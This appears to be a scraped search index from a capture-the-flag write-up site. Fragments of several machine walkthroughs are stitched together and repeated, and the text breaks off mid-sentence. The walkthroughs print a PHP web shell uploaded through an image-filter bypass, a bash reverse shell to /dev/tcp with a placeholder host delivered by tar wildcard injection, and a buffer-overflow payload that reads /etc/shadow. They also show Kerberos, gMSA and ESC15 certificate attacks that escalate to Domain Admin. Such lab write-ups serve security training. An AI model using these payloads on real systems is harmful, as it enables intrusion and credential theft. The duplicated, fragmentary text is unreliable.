generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups. There is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\nOne of these commands is particularly useful: it can create cron jobs. Since we can run this program as root, we create a cron job that copies the Root Flag to a file called pwned.txt in /tmp and sets permissions so we can finally read the flag.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;cp /root/root.txt /tmp/pwned.txt \u0026amp;\u0026amp; chmod 777 /tmp/pwned.txt\u0026#34; --name \u0026#34;pwned\u0026#34; Machine completed!!\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups. There is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\nOne of these commands is particularly useful: it can create cron jobs. Since we can run this program as root, we create a cron job that copies the Root Flag to a file called pwned.txt in /tmp and sets permissions so we can finally read the flag.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;cp /root/root.txt /tmp/pwned.txt \u0026amp;\u0026amp; chmod 777 /tmp/pwned.txt\u0026#34; --name \u0026#34;pwned\u0026#34; Machine completed!!\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using 